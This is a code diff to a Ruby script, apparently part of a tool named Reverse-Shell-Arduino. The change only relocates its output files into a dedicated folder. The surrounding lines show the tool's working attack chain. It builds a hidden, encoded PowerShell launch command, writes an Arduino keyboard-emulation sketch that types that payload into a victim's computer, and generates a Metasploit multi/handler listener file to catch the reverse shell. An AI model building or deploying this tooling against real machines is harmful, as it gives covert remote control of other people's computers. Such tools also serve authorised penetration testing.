@@ -92,10 +92,11 @@ def powershell_string(shellcode)
 end
 
 def shell_setup(encoded_command)
-  print_info("Saving encoded PowerShell payload to ~/shell.txt\n")
+  print_info("Saving encoded PowerShell payload to ~/Reverse-Shell-Arduino/shell.txt\n")
   s = "powershell -nop -windowstyle hidden -noni -enc #{encoded_command}"
-  File.write("#{Dir.home}/shell.txt", s)
-  print_success("shell.txt saved to #{Dir.home}\n")
+  Dir.mkdir("#{Dir.home}/Reverse-Shell-Arduino") unless Dir.exist?("#{Dir.home}/Reverse-Shell-Arduino")
+  File.write("#{Dir.home}/Reverse-Shell-Arduino/shell.txt", s)
+  print_success("shell.txt saved to ~/Reverse-Shell-Arduino\n")
 end
 
 def arduino_setup(host)
@@ -126,13 +127,13 @@ def arduino_setup(host)
   s << "  delay(500);\n"
   s << "  Keyboard.release(key);\n"
   s << "}\n"
-  File.write("#{Dir.home}/reverse_shell_arduino.txt", s)
-  print_success("Arduino sketch saved as ~/reverse_shell_arduino.txt\n")
+  File.write("#{Dir.home}/Reverse-Shell-Arduino/reverse_shell_arduino.txt", s)
+  print_success("Arduino sketch saved as ~/Reverse-Shell-Arduino/reverse_shell_arduino.txt\n")
 end
 
 def metasploit_setup(msf_path, host, port)
   print_info("Starting Metasploit listener...\n")
-  rc_file = "#{Dir.home}/msf_listener.rc"
+  rc_file = "#{Dir.home}/Reverse-Shell-Arduino/msf_listener.rc"
   File.open(rc_file, 'w') do |file|
     file.puts("use exploit/multi/handler")
     file.puts("set PAYLOAD #{@set_payload}")
@@ -165,4 +166,4 @@ arduino_setup(host)
 msf = rgets('Start Metasploit listener now? [yes/no]: ', 'no')
 metasploit_setup(msf_path, host, port) if msf.downcase == 'yes'
 
-print_info("All done! Files saved in your $HOME directory.\n")
+print_info("All done! Files saved in ~/Reverse-Shell-Arduino directory.\n")
